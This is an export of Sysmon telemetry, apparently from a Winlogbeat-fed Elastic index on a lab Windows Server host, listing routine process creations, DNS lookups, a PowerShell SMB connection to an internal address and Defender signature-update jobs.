"May 28, 2026 @ 12:06:11.187"	"'-RDVbZ4ByrYY_kgLtHuc"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:06:13.170"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:06:11.186
ProcessGuid: {6e4a868b-0583-6a18-1401-000000002300}
ProcessId: 5724
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0583-6a18-1401-000000002300}"	5724	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:06:11.186"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16442	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:06:00.643"	"9hDVbZ4ByrYY_kgLinvu"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Network connection detected (rule: NetworkConnect)"	3	"May 28, 2026 @ 12:06:02.163"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Network connection detected:
RuleName: -
UtcTime: 2026-05-28 09:05:59.521
ProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ProcessId: 1192
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: LAB2019\Administrator
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.1.251
SourceHostname: WIN-JOCP945SK51.lab2019.local
SourcePort: 49946
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.1.218
DestinationHostname: -
DestinationPort: 445
DestinationPortName: microsoft-ds"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	"'-"	"192.168.1.218"	false	445	"microsoft-ds"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	true	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	" - "	tcp	" - "	" - "	" - "	"'-"	"WIN-JOCP945SK51.lab2019.local"	"192.168.1.251"	false	49946	"'-"	" - "	"LAB2019\Administrator"	"2026-05-28 09:05:59.521"	" - "	" - "	3	" - "	Info	"3,216"	"4,112"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16441	"Network connection detected (rule: NetworkConnect)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:03:31.340"	"sRDTbZ4ByrYY_kgLJ3u5"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:03:33.077"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:03:31.336
ProcessGuid: {6e4a868b-04e3-6a18-1201-000000002300}
ProcessId: 5496
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe
FileVersion: 10.0.17763.8754 (WinBuild.160101.0800)
Description: Windows Modules Installer Worker
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TiWorker.exe
CommandLine: C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=E8E7C1A163D1EA507D8CC2FCD707FC78,SHA256=55B73781B087BF1622809F3458129026DA33849F2181E7538C625BA8A577503B,IMPHASH=1CBCFAF36C2AD99E911D299737C12477
ParentProcessGuid: {6e4a868b-012d-6a18-0e00-000000002300}
ParentProcessId: 888
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe -Embedding"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer Worker"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8754 (WinBuild.160101.0800)"	" - "	"MD5=E8E7C1A163D1EA507D8CC2FCD707FC78,SHA256=55B73781B087BF1622809F3458129026DA33849F2181E7538C625BA8A577503B,IMPHASH=1CBCFAF36C2AD99E911D299737C12477"	"C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TiWorker.exe"	"C:\Windows\system32\svchost.exe -k DcomLaunch -p"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012d-6a18-0e00-000000002300}"	888	"NT AUTHORITY\SYSTEM"	"{6e4a868b-04e3-6a18-1201-000000002300}"	5496	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:03:31.336"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16440	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:03:31.325"	"rxDTbZ4ByrYY_kgLJ3u5"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:03:33.077"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:03:31.320
ProcessGuid: {6e4a868b-04e3-6a18-1101-000000002300}
ProcessId: 7140
Image: C:\Windows\servicing\TrustedInstaller.exe
FileVersion: 10.0.17763.8276 (WinBuild.160101.0800)
Description: Windows Modules Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\servicing\TrustedInstaller.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8276 (WinBuild.160101.0800)"	" - "	"MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F"	"C:\Windows\servicing\TrustedInstaller.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TrustedInstaller.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-04e3-6a18-1101-000000002300}"	7140	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:03:31.320"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16438	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:03:31.282"	"rhDTbZ4ByrYY_kgLJ3u5"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:03:33.077"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:03:31.279
ProcessGuid: {6e4a868b-04e3-6a18-1001-000000002300}
ProcessId: 7188
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.17763.1852 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe Install $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"taskhostw.exe Install $(Arg0)"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Tasks"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1852 (WinBuild.160101.0800)"	" - "	"MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A"	"C:\Windows\System32\taskhostw.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"taskhostw.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-04e3-6a18-1001-000000002300}"	7188	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:03:31.279"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16437	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:02:53.655"	"NBDSbZ4ByrYY_kgLpnuN"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:02:55.053"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:02:51.642
ProcessGuid: {6e4a868b-012b-6a18-0c00-000000002300}
ProcessId: 648
QueryName: WIN-JOCP945SK51.lab2019.local
QueryStatus: 0
QueryResults: 192.168.1.251;
Image: C:\Windows\System32\lsass.exe
User: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\lsass.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-012b-6a18-0c00-000000002300}"	648	" - "	" - "	"WIN-JOCP945SK51.lab2019.local"	"192.168.1.251;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:02:51.642"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16436	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:02:53.655"	"MxDSbZ4ByrYY_kgLpnuN"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:02:55.053"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:02:51.642
ProcessGuid: {6e4a868b-012b-6a18-0c00-000000002300}
ProcessId: 648
QueryName: WIN-JOCP945SK51.lab2019.local
QueryStatus: 0
QueryResults: ::1;
Image: C:\Windows\System32\lsass.exe
User: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\lsass.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-012b-6a18-0c00-000000002300}"	648	" - "	" - "	"WIN-JOCP945SK51.lab2019.local"	"::1;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:02:51.642"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16435	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:58:35.073"	"3xDObZ4ByrYY_kgLvHqG"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 11:58:36.914"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 08:58:35.071
ProcessGuid: {6e4a868b-03bb-6a18-0f01-000000002300}
ProcessId: 5944
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-03bb-6a18-0f01-000000002300}"	5944	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 08:58:35.071"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16434	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:58:03.405"	"chDObZ4ByrYY_kgLK3rp"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 11:58:04.896"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 08:58:03.403
ProcessGuid: {6e4a868b-039b-6a18-0a01-000000002300}
ProcessId: 7276
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe
FileVersion: 4.18.26040.7 (8d846dd50fd7adca65beb1b013a5fda76a9ec807)
Description: Microsoft Malware Protection Command Line Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpCmdRun.exe
CommandLine: ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=66279F51DE8401F4D341B50C4DDCECFE,SHA256=F75D5C7E266452790259595DDC73DC83CD31B304452095494079CA41A7D4C69E,IMPHASH=972772FD61F841DF9B4EA185FD4CB03C
ParentProcessGuid: {6e4a868b-013d-6a18-5000-000000002300}
ParentProcessId: 3260
ParentImage: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MsMpEng.exe
ParentCommandLine: ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MsMpEng.exe""
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate"	"Microsoft Corporation"	"C:\Windows\system32\"	"Microsoft Malware Protection Command Line Utility"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"4.18.26040.7 (8d846dd50fd7adca65beb1b013a5fda76a9ec807)"	" - "	"MD5=66279F51DE8401F4D341B50C4DDCECFE,SHA256=F75D5C7E266452790259595DDC73DC83CD31B304452095494079CA41A7D4C69E,IMPHASH=972772FD61F841DF9B4EA185FD4CB03C"	"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"MpCmdRun.exe"	"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MsMpEng.exe"""	"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MsMpEng.exe"	"{6e4a868b-013d-6a18-5000-000000002300}"	3260	"NT AUTHORITY\SYSTEM"	"{6e4a868b-039b-6a18-0a01-000000002300}"	7276	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 08:58:03.403"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16429	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:58:03.360"	"cBDObZ4ByrYY_kgLK3rp"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 11:58:04.896"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 08:58:03.355
ProcessGuid: {6e4a868b-039b-6a18-0801-000000002300}
ProcessId: 5908
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe
FileVersion: 4.18.26040.7 (8d846dd50fd7adca65beb1b013a5fda76a9ec807)
Description: Microsoft Malware Protection Command Line Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpCmdRun.exe
CommandLine: ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=66279F51DE8401F4D341B50C4DDCECFE,SHA256=F75D5C7E266452790259595DDC73DC83CD31B304452095494079CA41A7D4C69E,IMPHASH=972772FD61F841DF9B4EA185FD4CB03C
ParentProcessGuid: {6e4a868b-013d-6a18-5000-000000002300}
ParentProcessId: 3260
ParentImage: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MsMpEng.exe
ParentCommandLine: ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MsMpEng.exe""
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges"	"Microsoft Corporation"	"C:\Windows\system32\"	"Microsoft Malware Protection Command Line Utility"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"4.18.26040.7 (8d846dd50fd7adca65beb1b013a5fda76a9ec807)"	" - "	"MD5=66279F51DE8401F4D341B50C4DDCECFE,SHA256=F75D5C7E266452790259595DDC73DC83CD31B304452095494079CA41A7D4C69E,IMPHASH=972772FD61F841DF9B4EA185FD4CB03C"	"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"MpCmdRun.exe"	"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MsMpEng.exe"""	"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MsMpEng.exe"	"{6e4a868b-013d-6a18-5000-000000002300}"	3260	"NT AUTHORITY\SYSTEM"	"{6e4a868b-039b-6a18-0801-000000002300}"	5908	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 08:58:03.355"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16427	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:57:41.288"	"axDNbZ4ByrYY_kgL4nrZ"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 11:57:42.882"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
